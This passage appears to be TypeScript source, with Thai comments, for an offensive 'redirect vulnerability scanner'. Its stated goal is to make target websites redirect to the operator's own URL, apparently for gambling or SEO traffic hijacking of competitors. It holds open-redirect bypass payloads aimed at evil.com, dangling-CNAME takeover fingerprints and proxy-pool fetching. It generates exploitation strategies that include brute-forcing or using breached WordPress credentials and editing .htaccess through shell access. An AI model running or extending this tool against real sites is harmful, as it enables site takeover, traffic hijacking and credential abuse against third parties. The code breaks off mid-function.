/**
 * Deep Redirect Vulnerability Scanner
 * 
 * เป้าหมายสูงสุด: ค้นหาทุกช่องโหว่ redirect บนเว็บเป้าหมาย เพื่อเปลี่ยน redirect เดิมให้ชี้มาที่เรา
 * 
 * สแกน 8 ประเภท:
 * 1. Open Redirect Parameters — สแกน ?url=, ?redirect=, ?next= ฯลฯ บน common paths
 * 2. Redirect Chain Analysis — follow 301/302/307 chains หา weak links
 * 3. WP Redirect Plugin Detection — ตรวจหา Redirection, 301 Redirects, Safe Redirect Manager
 * 4. .htaccess / web.config Redirect Rules — อ่าน redirect rules ที่ expose
 * 5. Meta Refresh & JS Redirect Detection — หา client-side redirects
 * 6. DNS CNAME / Subdomain Dangling — หา dangling CNAME ที่ claim ได้
 * 7. Expired Domain in Redirect Chain — หา domain ที่หมดอายุใน chain
 * 8. OAuth / Login Redirect Abuse — หา redirect_uri ที่ไม่ validate
 * 
 * ผลลัพธ์: รายงาน vulnerability ทั้งหมด + recommended exploitation strategy
 */

import { fetchWithPoolProxy } from "./proxy-pool";

// ═══════════════════════════════════════════════════════
//  TYPES
// ═══════════════════════════════════════════════════════

export interface RedirectVulnerability {
  type: RedirectVulnType;
  severity: "critical" | "high" | "medium" | "low" | "info";
  /** Where the vuln was found */
  location: string;
  /** The vulnerable URL or parameter */
  vulnerableUrl: string;
  /** Current redirect destination (competitor URL) */
  currentDestination: string | null;
  /** Can we exploit this to redirect to our URL? */
  exploitable: boolean;
  /** How to exploit */
  exploitStrategy: string;
  /** Confidence level */
  confidence: number; // 0-100
  /** Raw evidence */
  evidence: string;
  /** Additional details */
  details: string;
}

export type RedirectVulnType =
  | "open_redirect_param"       // ?url=evil.com works
  | "open_redirect_path"        // /redirect/evil.com works
  | "redirect_chain_weak_link"  // 301 chain has expired/claimable domain
  | "wp_redirect_plugin"        // Redirection plugin accessible
  | "htaccess_redirect"         // .htaccess redirect rules exposed
  | "webconfig_redirect"        // web.config redirect rules exposed
  | "meta_refresh_redirect"     // <meta http-equiv="refresh"> found
  | "js_redirect"               // JavaScript redirect found
  | "dangling_cname"            // CNAME points to unclaimed service
  | "expired_domain_in_chain"   // Domain in redirect chain is expired/available
  | "oauth_redirect_abuse"      // OAuth redirect_uri not validated
  | "login_redirect_abuse"      // Login ?next= not validated
  | "header_redirect"           // Server-side 301/302 redirect
  | "content_injection"         // Gambling/SEO content injected
  | "wp_rest_redirect"          // WP REST API allows redirect modification
  | "server_misconfiguration"   // Server config allows redirect manipulation
  | "php_code_injection"        // PHP malicious code found in index/page
  | "path_specific_redirect"    // Redirect only on specific path (e.g. /menus)
  | "php_backdoor"              // PHP backdoor/shell found
  | "php_cloaking"              // PHP cloaking code (User-Agent/GeoIP based redirect)
  | "geo_cloaking";             // Geo-based cloaking (redirect only for specific country IPs)

export interface PhpCodeFinding {
  /** Type of PHP code found */
  type: "redirect" | "backdoor" | "seo_spam" | "cloaking" | "obfuscated" | "include_remote" | "eval_exec" | "unknown";
  /** The PHP function/pattern detected */
  pattern: string;
  /** Code snippet */
  codeSnippet: string;
  /** Where found (URL) */
  foundAt: string;
  /** Severity */
  severity: "critical" | "high" | "medium" | "low";
  /** Analysis */
  analysis: string;
}

export interface GeoCloakingResult {
  /** Was geo-cloaking detected? */
  detected: boolean;
  /** What type of cloaking */
  cloakingType: "user_agent" | "geo_ip" | "referer" | "combined" | "none";
  /** Normal response summary */
  normalResponse: { statusCode: number; bodyLength: number; hasGambling: boolean; redirectTo: string | null };
  /** Cloaked response summary (different UA/proxy) */
  cloakedResponses: Array<{
    method: string; // e.g. "googlebot", "thai_mobile", "proxy_residential"
    statusCode: number;
    bodyLength: number;
    hasGambling: boolean;
    redirectTo: string | null;
    bodyDiffPercent: number;
  }>;
  /** Gambling keywords found in cloaked response */
  gamblingKeywordsFound: string[];
  /** Evidence summary */
  evidence: string;
}

export interface PathRedirectInfo {
  /** The specific path */
  path: string;
  /** Full URL */
  fullUrl: string;
  /** Is this path redirecting? */
  isRedirecting: boolean;
  /** Redirect destination */
  destination: string | null;
  /** Redirect type (301, 302, meta, js) */
  redirectType: string | null;
  /** Status code */
  statusCode: number;
  /** PHP code found at this path? */
  phpCodeFound: PhpCodeFinding[];
  /** Gambling content detected? */
  hasGamblingContent: boolean;
}

export interface DeepRedirectScanResult {
  domain: string;
  scanStarted: number;
  scanDuration: number;
  /** All vulnerabilities found */
  vulnerabilities: RedirectVulnerability[];
  /** Is the site currently redirecting? */
  isCurrentlyRedirecting: boolean;
  /** Current redirect destination (if any) */
  currentRedirectDestination: string | null;
  /** Redirect chain (if any) */
  redirectChain: RedirectChainHop[];
  /** Detected CMS */
  detectedCms: string | null;
  /** Detected WP redirect plugins */
  detectedRedirectPlugins: string[];
  /** Summary for AI/Telegram */
  summary: string;
  /** Top exploitation strategy */
  topStrategy: ExploitationStrategy | null;
  /** All possible exploitation strategies ranked */
  strategies: ExploitationStrategy[];
  /** PHP code findings at index and key pages */
  phpCodeFindings: PhpCodeFinding[];
  /** Path-specific redirect info (when targetUrl has path) */
  pathRedirects: PathRedirectInfo[];
  /** Target URL that was scanned (if full URL provided) */
  targetUrl: string | null;
  /** Geo-cloaking detection results */
  geoCloaking: GeoCloakingResult | null;
}

export interface RedirectChainHop {
  url: string;
  statusCode: number;
  redirectType: "301" | "302" | "307" | "308" | "meta" | "js" | "none";
  server: string | null;
  /** Is this hop's domain expired or available? */
  domainAvailable: boolean;
  /** Is this hop's domain a dangling CNAME? */
  danglingCname: boolean;
}

export interface ExploitationStrategy {
  id: string;
  name: string;
  description: string;
  /** Which vulnerabilities this strategy exploits */
  exploitsVulns: number[]; // indices into vulnerabilities array
  /** Estimated success probability */
  successProbability: number; // 0-100
  /** Steps to execute */
  steps: string[];
  /** Required access level */
  requiredAccess: "none" | "low" | "medium" | "high";
}

// ═══════════════════════════════════════════════════════
//  CONSTANTS
// ═══════════════════════════════════════════════════════

const SCAN_TIMEOUT = 8000;
const MAX_CHAIN_HOPS = 15;

/** Common redirect parameter names */
const REDIRECT_PARAMS = [
  "url", "redirect", "redirect_to", "redirect_url", "redirectUrl",
  "return", "returnUrl", "return_url", "returnTo", "return_to",
  "next", "nextUrl", "next_url", "goto", "go", "go_to",
  "dest", "destination", "target", "to", "out", "link",
  "rurl", "redir", "continue", "forward", "ref", "site",
  "view", "page", "callback", "cb", "redirect_uri",
  "success_url", "error_url", "cancel_url", "back_url",
  "login_redirect", "logout_redirect", "after_login",
];

/** Common paths that often have redirect parameters */
const REDIRECT_PATHS = [
  "/", "/login", "/logout", "/signin", "/signout",
  "/auth/login", "/auth/callback", "/oauth/authorize",
  "/wp-login.php", "/wp-admin/", "/administrator/",
  "/account/login", "/user/login", "/users/sign_in",
  "/redirect", "/go", "/out", "/link", "/click",
  "/api/auth/callback", "/api/oauth/callback",
  "/sso/login", "/cas/login",
];

/** Open redirect bypass payloads */
const REDIRECT_PAYLOADS = [
  "https://evil.com",
  "//evil.com",
  "\\/evil.com",
  "/\\evil.com",
  "https://evil.com@{host}",
  "//evil.com/%2f..",
  "https://{host}.evil.com",
  "https://evil.com/{host}",
  "https://evil.com#@{host}",
  "https://evil.com?.{host}",
  "///evil.com",
  "////evil.com",
  "https:evil.com",
  "http:evil.com",
  "//evil%00.com",
  "//%0d%0aevil.com",
  "https://evil.com%23@{host}",
  "https://evil.com%2f@{host}",
];

/** Known WP redirect plugins */
const WP_REDIRECT_PLUGINS = [
  { slug: "redirection", name: "Redirection", apiPath: "/wp-json/redirection/v1/redirect", adminPage: "tools.php?page=redirection.php" },
  { slug: "301-redirects", name: "301 Redirects", apiPath: "/wp-json/301-redirects/v1/redirects", adminPage: "options-general.php?page=301redirects" },
  { slug: "safe-redirect-manager", name: "Safe Redirect Manager", apiPath: "/wp-json/srm/v1/redirects", adminPage: "edit.php?post_type=redirect_rule" },
  { slug: "eps-301-redirects", name: "EPS 301 Redirects", apiPath: null, adminPage: "options-general.php?page=eps_redirects" },
  { slug: "simple-301-redirects", name: "Simple 301 Redirects", apiPath: null, adminPage: "options-general.php?page=301options" },
  { slug: "wp-redirect", name: "WP Redirect", apiPath: null, adminPage: null },
  { slug: "seo-redirection", name: "SEO Redirection", apiPath: null, adminPage: "admin.php?page=seo-redirection" },
  { slug: "quick-page-post-redirect-plugin", name: "Quick Page/Post Redirect", apiPath: null, adminPage: "admin.php?page=redirect-updates" },
];

/** Dangling CNAME fingerprints — services that can be claimed */
const DANGLING_SERVICE_FINGERPRINTS = [
  { cname: "github.io", service: "GitHub Pages", claimable: true, response: "There isn't a GitHub Pages site here" },
  { cname: "herokuapp.com", service: "Heroku", claimable: true, response: "no-such-app" },
  { cname: "s3.amazonaws.com", service: "AWS S3", claimable: true, response: "NoSuchBucket" },
  { cname: "s3-website", service: "AWS S3 Website", claimable: true, response: "NoSuchBucket" },
  { cname: "cloudfront.net", service: "CloudFront", claimable: false, response: "Bad request" },
  { cname: "azurewebsites.net", service: "Azure", claimable: true, response: "404 Web Site not found" },
  { cname: "cloudapp.net", service: "Azure Cloud", claimable: true, response: "" },
  { cname: "trafficmanager.net", service: "Azure Traffic Manager", claimable: true, response: "" },
  { cname: "blob.core.windows.net", service: "Azure Blob", claimable: true, response: "BlobNotFound" },
  { cname: "netlify.app", service: "Netlify", claimable: true, response: "Not Found" },
  { cname: "netlify.com", service: "Netlify", claimable: true, response: "Not Found" },
  { cname: "vercel.app", service: "Vercel", claimable: true, response: "" },
  { cname: "surge.sh", service: "Surge", claimable: true, response: "project not found" },
  { cname: "bitbucket.io", service: "Bitbucket", claimable: true, response: "" },
  { cname: "ghost.io", service: "Ghost", claimable: true, response: "" },
  { cname: "myshopify.com", service: "Shopify", claimable: false, response: "Sorry, this shop is currently unavailable" },
  { cname: "statuspage.io", service: "Statuspage", claimable: true, response: "" },
  { cname: "zendesk.com", service: "Zendesk", claimable: true, response: "Help Center Closed" },
  { cname: "teamwork.com", service: "Teamwork", claimable: true, response: "" },
  { cname: "unbounce.com", service: "Unbounce", claimable: true, response: "The requested URL was not found" },
  { cname: "wpengine.com", service: "WP Engine", claimable: false, response: "" },
  { cname: "pantheon.io", service: "Pantheon", claimable: true, response: "404 error unknown site" },
  { cname: "fastly.net", service: "Fastly", claimable: false, response: "Fastly error: unknown domain" },
  { cname: "helpjuice.com", service: "Helpjuice", claimable: true, response: "We could not find what you're looking for" },
  { cname: "helpscoutdocs.com", service: "HelpScout", claimable: true, response: "No settings were found" },
  { cname: "feedpress.me", service: "FeedPress", claimable: true, response: "The feed has not been found" },
  { cname: "freshdesk.com", service: "Freshdesk", claimable: true, response: "" },
  { cname: "readme.io", service: "ReadMe", claimable: true, response: "Project doesnt exist" },
  { cname: "tictail.com", service: "Tictail", claimable: true, response: "" },
  { cname: "cargocollective.com", service: "Cargo", claimable: true, response: "404 Not Found" },
  { cname: "fly.dev", service: "Fly.io", claimable: true, response: "" },
];

// ═══════════════════════════════════════════════════════
//  HELPERS
// ═══════════════════════════════════════════════════════

async function safeFetch(url: string, opts: RequestInit = {}, timeoutMs = SCAN_TIMEOUT): Promise<Response | null> {
  const domain = url.replace(/^https?:\/\//, "").replace(/[\/:].*$/, "");
  try {
    const { response } = await fetchWithPoolProxy(url, {
      ...opts,
      signal: AbortSignal.timeout(timeoutMs),
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        ...opts.headers,
      },
    }, { targetDomain: domain, timeout: timeoutMs });
    return response;
  } catch {
    return null;
  }
}

async function directFetch(url: string, opts: RequestInit = {}, timeoutMs = SCAN_TIMEOUT): Promise<Response | null> {
  try {
    return await fetch(url, {
      ...opts,
      signal: AbortSignal.timeout(timeoutMs),
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        ...opts.headers,
      },
    });
  } catch {
    return null;
  }
}

async function dnsLookup(domain: string, type: string): Promise<string[]> {
  try {
    const resp = await directFetch(`https://dns.google/resolve?name=${encodeURIComponent(domain)}&type=${type}`, {}, 5000);
    if (!resp) return [];
    const data = await resp.json();
    if (data.Answer) return data.Answer.map((a: any) => a.data?.replace(/\.$/, "") || "");
    return [];
  } catch {
    return [];
  }
}

function extractDomain(url: string): string {
  try {
    return new URL(url).hostname;
  } catch {
    return url.replace(/^https?:\/\//, "").replace(/[\/:].*$/, "");
  }
}

// ═══════════════════════════════════════════════════════
//  SCAN 1: OPEN REDIRECT PARAMETERS
// ═══════════════════════════════════════════════════════

async function scanOpenRedirectParams(
  baseUrl: string,
  domain: string,
): Promise<RedirectVulnerability[]> {
  const vulns: RedirectVulnerability[] = [];
  const tested = new Set<string>();

  // Test top priority paths + params (limit to avoid timeout)
  const priorityPaths = REDIRECT_PATHS.slice(0, 8);
  const priorityParams = REDIRECT_PARAMS.slice(0, 10);
  const priorityPayloads = REDIRECT_PAYLOADS.slice(0, 6);

  const promises: Promise<void>[] = [];

  for (const path of priorityPaths) {
    for (const param of priorityParams) {
      const key = `${path}:${param}`;
      if (tested.has(key)) continue;
      tested.add(key);

      promises.push((async () => {
        for (const rawPayload of priorityPayloads) {
          const payload = rawPayload.replace(/\{host\}/g, domain);
          const testUrl = `${baseUrl}${path}?${param}=${encodeURIComponent(payload)}`;

          try {
            const resp = await safeFetch(testUrl, { redirect: "manual" }, 5000);
            if (!resp) continue;

            if (resp.status >= 300 && resp.status < 400) {
              const location = resp.headers.get("location") || "";
              if (location.includes("evil.com")) {
                vulns.push({
                  type: "open_redirect_param",
                  severity: "critical",
                  location: `${path}?${param}=`,
                  vulnerableUrl: testUrl,
                  currentDestination: null,
                  exploitable: true,
                  exploitStrategy: `ใช้ Open Redirect: ${baseUrl}${path}?${param}=${encodeURIComponent("OUR_URL")} — เว็บจะ redirect ไปหาเราเอง`,
                  confidence: 95,
                  evidence: `HTTP ${resp.status} → Location: ${location}`,
                  details: `Open Redirect พบที่ ${path} ผ่าน parameter "${param}" — สามารถ redirect ไปที่ไหนก็ได้`,
                });
                return; // Found for this path+param, move on
              }
            }

            // Check for JS-based redirect in body
            if (resp.status === 200) {
              const body = await resp.text();
              if (body.includes("evil.com") && (body.includes("location") || body.includes("redirect"))) {
                vulns.push({
                  type: "open_redirect_param",
                  severity: "high",
                  location: `${path}?${param}= (JS redirect)`,
                  vulnerableUrl: testUrl,
                  currentDestination: null,
                  exploitable: true,
                  exploitStrategy: `Open Redirect ผ่าน JS: ${baseUrl}${path}?${param}=${encodeURIComponent("OUR_URL")}`,
                  confidence: 80,
                  evidence: `JS redirect to evil.com found in response body`,
                  details: `JavaScript-based open redirect พบที่ ${path} ผ่าน parameter "${param}"`,
                });
                return;
              }
            }
          } catch {}
        }
      })());

      // Limit concurrency: batch 10 at a time
      if (promises.length >= 10) {
        await Promise.allSettled(promises.splice(0, 10));
      }
    }
  }

  await Promise.allSettled(promises);
  return vulns;
}

// ═══════════════════════════════════════════════════════
//  SCAN 2: REDIRECT CHAIN ANALYSIS
// ═══════════════════════════════════════════════════════

async function scanRedirectChain(
  targetUrl: string,
): Promise<{ chain: RedirectChainHop[]; vulns: RedirectVulnerability[] }> {
  const chain: RedirectChainHop[] = [];
  const vulns: RedirectVulnerability[] = [];
  let currentUrl = targetUrl;

  for (let i = 0; i < MAX_CHAIN_HOPS; i++) {
    try {
      const resp = await safeFetch(currentUrl, { redirect: "manual" }, 8000);
      if (!resp) {
        chain.push({
          url: currentUrl,
          statusCode: 0,
          redirectType: "none",
          server: null,
          domainAvailable: false,
          danglingCname: false,
        });
        break;
      }

      const status = resp.status;
      const location = resp.headers.get("location") || "";
      const server = resp.headers.get("server") || null;

      let redirectType: RedirectChainHop["redirectType"] = "none";
      if (status === 301) redirectType = "301";
      else if (status === 302) redirectType = "302";
      else if (status === 307) redirectType = "307";
      else if (status === 308) redirectType = "308";

      // Check for meta refresh or JS redirect in body
      if (status === 200 && !location) {
        try {
          const body = await resp.text();
          const metaMatch = body.match(/<meta\s+http-equiv=["']refresh["']\s+content=["']\d+;\s*url=([^"']+)["']/i);
          if (metaMatch) {
            redirectType = "meta";
            const metaUrl = metaMatch[1].startsWith("http") ? metaMatch[1] : new URL(metaMatch[1], currentUrl).href;
            chain.push({ url: currentUrl, statusCode: status, redirectType, server, domainAvailable: false, danglingCname: false });
            currentUrl = metaUrl;
            continue;
          }

          const jsMatch = body.match(/(?:window\.)?location(?:\.href)?\s*=\s*["']([^"']+)["']/);
          if (jsMatch) {
            redirectType = "js";
            const jsUrl = jsMatch[1].startsWith("http") ? jsMatch[1] : new URL(jsMatch[1], currentUrl).href;
            chain.push({ url: currentUrl, statusCode: status, redirectType, server, domainAvailable: false, danglingCname: false });
            currentUrl = jsUrl;
            continue;
          }
        } catch {}
      }

      chain.push({ url: currentUrl, statusCode: status, redirectType, server, domainAvailable: false, danglingCname: false });

      if (status >= 300 && status < 400 && location) {
        const nextUrl = location.startsWith("http") ? location : new URL(location, currentUrl).href;
        currentUrl = nextUrl;
        continue;
      }

      break; // Not a redirect
    } catch {
      chain.push({ url: currentUrl, statusCode: 0, redirectType: "none", server: null, domainAvailable: false, danglingCname: false });
      break;
    }
  }

  // Analyze chain for weak links
  const seenDomains = new Set<string>();
  for (let i = 0; i < chain.length; i++) {
    const hop = chain[i];
    const hopDomain = extractDomain(hop.url);
    seenDomains.add(hopDomain);

    // Check if domain in chain is expired/available
    if (i > 0) { // Skip the target itself
      try {
        const aRecords = await dnsLookup(hopDomain, "A");
        if (aRecords.length === 0) {
          hop.domainAvailable = true;
          vulns.push({
            type: "expired_domain_in_chain",
            severity: "critical",
            location: `Redirect chain hop #${i + 1}`,
            vulnerableUrl: hop.url,
            currentDestination: chain[chain.length - 1]?.url || null,
            exploitable: true,
            exploitStrategy: `Domain "${hopDomain}" ใน redirect chain ไม่มี A record — สามารถจดทะเบียนแล้ว redirect ไปที่เรา`,
            confidence: 90,
            evidence: `DNS A record lookup for ${hopDomain} returned empty`,
            details: `Domain ${hopDomain} ที่อยู่ใน redirect chain (hop #${i + 1}) ไม่มี DNS A record — อาจหมดอายุหรือถูกปล่อย`,
          });
        }

        // Check CNAME for dangling
        const cnames = await dnsLookup(hopDomain, "CNAME");
        for (const cname of cnames) {
          for (const fp of DANGLING_SERVICE_FINGERPRINTS) {
            if (cname.includes(fp.cname) && fp.claimable) {
              hop.danglingCname = true;
              vulns.push({
                type: "dangling_cname",
                severity: "critical",
                location: `Redirect chain hop #${i + 1} → CNAME ${cname}`,
                vulnerableUrl: hop.url,
                currentDestination: chain[chain.length - 1]?.url || null,
                exploitable: true,
                exploitStrategy: `CNAME ${hopDomain} → ${cname} (${fp.service}) — สร้าง ${fp.service} project แล้ว claim domain นี้ redirect ไปที่เรา`,
                confidence: 85,
                evidence: `CNAME: ${hopDomain} → ${cname} (${fp.service})`,
                details: `Dangling CNAME: ${hopDomain} ชี้ไป ${fp.service} ที่ยังไม่มีใคร claim — สามารถ takeover ได้`,
              });
            }
          }
        }
      } catch {}
    }
  }

  // If chain has multiple hops, the site is redirecting
  if (chain.length > 1 && chain[0].redirectType !== "none") {
    const finalDest = chain[chain.length - 1].url;
    const targetDomain = extractDomain(chain[0].url);
    const finalDomain = extractDomain(finalDest);

    if (targetDomain !== finalDomain) {
      vulns.push({
        type: "header_redirect",
        severity: "high",
        location: "Server HTTP redirect",
        vulnerableUrl: chain[0].url,
        currentDestination: finalDest,
        exploitable: true,
        exploitStrategy: `เว็บ redirect จาก ${targetDomain} → ${finalDomain} — ใช้ redirect takeover module เพื่อเปลี่ยนปลายทาง`,
        confidence: 70,
        evidence: `Redirect chain: ${chain.map(h => `${h.statusCode} ${extractDomain(h.url)}`).join(" → ")}`,
        details: `พบ redirect chain ${chain.length} hops: ${chain.map(h => extractDomain(h.url)).join(" → ")}`,
      });
    }
  }

  return { chain, vulns };
}

// ═══════════════════════════════════════════════════════
//  SCAN 3: WP REDIRECT PLUGIN DETECTION
// ═══════════════════════════════════════════════════════

async function scanWpRedirectPlugins(
  baseUrl: string,
): Promise<{ plugins: string[]; vulns: RedirectVulnerability[] }> {
  const detectedPlugins: string[] = [];
  const vulns: RedirectVulnerability[] = [];

  // Check if site is WordPress first
  const wpCheck = await safeFetch(`${baseUrl}/wp-login.php`, { redirect: "manual" }, 5000);
  const isWp = wpCheck && (wpCheck.status === 200 || wpCheck.status === 302);
  if (!isWp) return { plugins: [], vulns: [] };

  // Check for redirect plugins in HTML source
  const mainResp = await safeFetch(baseUrl, {}, 6000);
  let mainBody = "";
  if (mainResp && mainResp.status === 200) {
    try { mainBody = await mainResp.text(); } catch {}
  }

  for (const plugin of WP_REDIRECT_PLUGINS) {
    // Check in page source
    if (mainBody.includes(`wp-content/plugins/${plugin.slug}`)) {
      detectedPlugins.push(plugin.name);
    }

    // Try to access plugin API endpoint (some are public)
    if (plugin.apiPath) {
      const apiResp = await safeFetch(`${baseUrl}${plugin.apiPath}`, {}, 5000);
      if (apiResp) {
        if (apiResp.status === 200) {
          try {
            const data = await apiResp.json();
            if (!detectedPlugins.includes(plugin.name)) detectedPlugins.push(plugin.name);
            vulns.push({
              type: "wp_redirect_plugin",
              severity: "critical",
              location: `WP Plugin: ${plugin.name} (${plugin.apiPath})`,
              vulnerableUrl: `${baseUrl}${plugin.apiPath}`,
              currentDestination: null,
              exploitable: true,
              exploitStrategy: `Plugin "${plugin.name}" API เปิดอยู่ — อ่าน redirect rules แล้ว modify ผ่าน API (ถ้ามี auth) หรือ exploit plugin vuln`,
              confidence: 85,
              evidence: `API returned ${JSON.stringify(data).slice(0, 200)}`,
              details: `WP Redirect Plugin "${plugin.name}" ตรวจพบ — API endpoint accessible`,
            });
          } catch {}
        } else if (apiResp.status === 401 || apiResp.status === 403) {
          // Plugin exists but requires auth
          if (!detectedPlugins.includes(plugin.name)) detectedPlugins.push(plugin.name);
          vulns.push({
            type: "wp_redirect_plugin",
            severity: "medium",
            location: `WP Plugin: ${plugin.name}`,
            vulnerableUrl: `${baseUrl}${plugin.apiPath}`,
            currentDestination: null,
            exploitable: true,
            exploitStrategy: `Plugin "${plugin.name}" ต้องการ auth — ใช้ WP credentials (brute force/breach) เพื่อเข้าถึง redirect rules`,
            confidence: 60,
            evidence: `API returned ${apiResp.status} (auth required)`,
            details: `WP Redirect Plugin "${plugin.name}" ตรวจพบ — ต้อง login ก่อนเข้าถึง`,
          });
        }
      }
    }

    // Try to access plugin readme for version info
    const readmeResp = await safeFetch(`${baseUrl}/wp-content/plugins/${plugin.slug}/readme.txt`, {}, 4000);
    if (readmeResp && readmeResp.status === 200) {
      if (!detectedPlugins.includes(plugin.name)) detectedPlugins.push(plugin.name);
      try {
        const readme = await readmeResp.text();
        const verMatch = readme.match(/Stable tag:\s*([\d.]+)/i);
        if (verMatch) {
          vulns.push({
            type: "wp_redirect_plugin",
            severity: "medium",
            location: `WP Plugin: ${plugin.name} v${verMatch[1]}`,
            vulnerableUrl: `${baseUrl}/wp-content/plugins/${plugin.slug}/readme.txt`,
            currentDestination: null,
            exploitable: true,
            exploitStrategy: `Plugin "${plugin.name}" v${verMatch[1]} — ค้นหา CVE สำหรับเวอร์ชันนี้ หรือใช้ WP admin access เพื่อแก้ไข redirect rules`,
            confidence: 50,
            evidence: `readme.txt exposed, version: ${verMatch[1]}`,
            details: `Plugin "${plugin.name}" version ${verMatch[1]} — readme.txt accessible`,
          });
        }
      } catch {}
    }
  }

  // Check WP REST API for redirect-related endpoints
  const wpApiResp = await safeFetch(`${baseUrl}/wp-json/`, {}, 5000);
  if (wpApiResp && wpApiResp.status === 200) {
    try {
      const apiData = await wpApiResp.json();
      const routes = Object.keys(apiData.routes || {});
      const redirectRoutes = routes.filter(r => 
        r.includes("redirect") || r.includes("301") || r.includes("rewrite")
      );
      if (redirectRoutes.length > 0) {
        vulns.push({
          type: "wp_rest_redirect",
          severity: "high",
          location: "WP REST API redirect routes",
          vulnerableUrl: `${baseUrl}/wp-json/`,
          currentDestination: null,
          exploitable: true,
          exploitStrategy: `WP REST API มี redirect routes: ${redirectRoutes.join(", ")} — ลอง access/modify ผ่าน API`,
          confidence: 65,
          evidence: `REST API routes: ${redirectRoutes.join(", ")}`,
          details: `พบ ${redirectRoutes.length} redirect-related REST API routes`,
        });
      }
    } catch {}
  }

  return { plugins: detectedPlugins, vulns };
}

// ═══════════════════════════════════════════════════════
//  SCAN 4: .HTACCESS / WEB.CONFIG REDIRECT RULES
// ═══════════════════════════════════════════════════════

async function scanConfigRedirects(
  baseUrl: string,
): Promise<RedirectVulnerability[]> {
  const vulns: RedirectVulnerability[] = [];

  // Check .htaccess
  const htaccessResp = await safeFetch(`${baseUrl}/.htaccess`, {}, 5000);
  if (htaccessResp && htaccessResp.status === 200) {
    try {
      const content = await htaccessResp.text();
      
      // Look for redirect rules
      const redirectPatterns = [
        { regex: /Redirect\s+(301|302|permanent|temp)\s+\S+\s+(https?:\/\/\S+)/gi, type: "Redirect directive" },
        { regex: /RedirectMatch\s+(301|302|permanent|temp)\s+\S+\s+(https?:\/\/\S+)/gi, type: "RedirectMatch" },
        { regex: /RewriteRule\s+.*?\s+\[.*?R=(\d+).*?\]/gi, type: "RewriteRule with redirect" },
        { regex: /RewriteRule\s+.*?(https?:\/\/[^\s\]]+)/gi, type: "RewriteRule to external" },
      ];

      for (const pattern of redirectPatterns) {
        let match;
        while ((match = pattern.regex.exec(content)) !== null) {
          const redirectUrl = match[2] || match[1];
          if (redirectUrl.startsWith("http")) {
            vulns.push({
              type: "htaccess_redirect",
              severity: "high",
              location: ".htaccess",
              vulnerableUrl: `${baseUrl}/.htaccess`,
              currentDestination: redirectUrl,
              exploitable: true,
              exploitStrategy: `.htaccess accessible — ถ้ามี write access (FTP/SSH/shell) สามารถแก้ไข redirect rules ได้โดยตรง`,
              confidence: 75,
              evidence: `${pattern.type}: ${match[0].slice(0, 200)}`,
              details: `.htaccess redirect rule พบ: ${pattern.type} → ${redirectUrl}`,
            });
          }
        }
      }

      // Even if no redirect rules, .htaccess being readable is useful
      if (vulns.length === 0 && content.length > 10) {
        vulns.push({
          type: "htaccess_redirect",
          severity: "medium",
          location: ".htaccess",
          vulnerableUrl: `${baseUrl}/.htaccess`,
          currentDestination: null,
          exploitable: true,
          exploitStrategy: `.htaccess readable (${content.length} bytes) — ถ้ามี write access สามารถเพิ่ม redirect rules ได้`,
          confidence: 50,
          evidence: `.htaccess content (${content.length} bytes): ${content.slice(0, 200)}`,
          details: `.htaccess file accessible — ไม่พบ redirect rules แต่สามารถเพิ่มได้ถ้ามี write access`,
        });
      }
    } catch {}
  }

  // Check web.config (IIS)
  const webConfigResp = await safeFetch(`${baseUrl}/web.config`, {}, 5000);
  if (webConfigResp && webConfigResp.status === 200) {
    try {
      const content = await webConfigResp.text();
      if (content.includes("<rule") || content.includes("redirect") || content.includes("httpRedirect")) {
        const urlMatch = content.match(/url="(https?:\/\/[^"]+)"/i);
        vulns.push({
          type: "webconfig_redirect",
          severity: "high",
          location: "web.config",
          vulnerableUrl: `${baseUrl}/web.config`,
          currentDestination: urlMatch?.[1] || null,
          exploitable: true,
          exploitStrategy: `web.config accessible — ถ้ามี write access สามารถแก้ไข IIS redirect rules ได้`,
          confidence: 70,
          evidence: `web.config content: ${content.slice(0, 300)}`,
          details: `IIS web.config file accessible with redirect configuration`,
        });
      }
    } catch {}
  }

  return vulns;
}

// ═══════════════════════════════════════════════════════
//  SCAN 5: META REFRESH & JS REDIRECT DETECTION
// ═══════════════════════════════════════════════════════

async function scanClientSideRedirects(
  baseUrl: string,
  domain: string,
): Promise<RedirectVulnerability[]> {
  const vulns: RedirectVulnerability[] = [];

  const resp = await safeFetch(baseUrl, { redirect: "follow" }, 8000);
  if (!resp || resp.status !== 200) return vulns;

  let body = "";
  try { body = await resp.text(); } catch { return vulns; }

  // Meta refresh
  const metaMatches = Array.from(body.matchAll(/<meta\s+http-equiv=["']refresh["']\s+content=["'](\d+);\s*url=([^"']+)["']/gi));
  for (const m of metaMatches) {
    const url = m[2];
    if (!url.includes(domain)) {
      vulns.push({
        type: "meta_refresh_redirect",
        severity: "high",
        location: "<meta http-equiv='refresh'>",
        vulnerableUrl: baseUrl,
        currentDestination: url,
        exploitable: true,
        exploitStrategy: `Meta refresh redirect ไป ${url} — ถ้าแก้ไข HTML ได้ (shell/FTP/WP admin) สามารถเปลี่ยนปลายทาง`,
        confidence: 80,
        evidence: m[0],
        details: `Meta refresh redirect: ${m[1]}s delay → ${url}`,
      });
    }
  }

  // JavaScript redirects
  const jsPatterns = [
    { regex: /window\.location\s*(?:\.href)?\s*=\s*["']([^"']+)["']/g, name: "window.location" },
    { regex: /location\.replace\s*\(\s*["']([^"']+)["']\s*\)/g, name: "location.replace" },
    { regex: /location\.assign\s*\(\s*["']([^"']+)["']\s*\)/g, name: "location.assign" },
    { regex: /top\.location\s*=\s*["']([^"']+)["']/g, name: "top.location" },
    { regex: /document\.location\s*=\s*["']([^"']+)["']/g, name: "document.location" },
    { regex: /self\.location\s*=\s*["']([^"']+)["']/g, name: "self.location" },
  ];

  for (const pattern of jsPatterns) {
    let match;
    while ((match = pattern.regex.exec(body)) !== null) {
      const url = match[1];
      if (url.startsWith("http") && !url.includes(domain)) {
        vulns.push({
          type: "js_redirect",
          severity: "high",
          location: `JavaScript: ${pattern.name}`,
          vulnerableUrl: baseUrl,
          currentDestination: url,
          exploitable: true,
          exploitStrategy: `JS redirect (${pattern.name}) ไป ${url} — ถ้าแก้ไข JS/HTML ได้ สามารถเปลี่ยนปลายทาง`,
          confidence: 80,
          evidence: match[0].slice(0, 200),
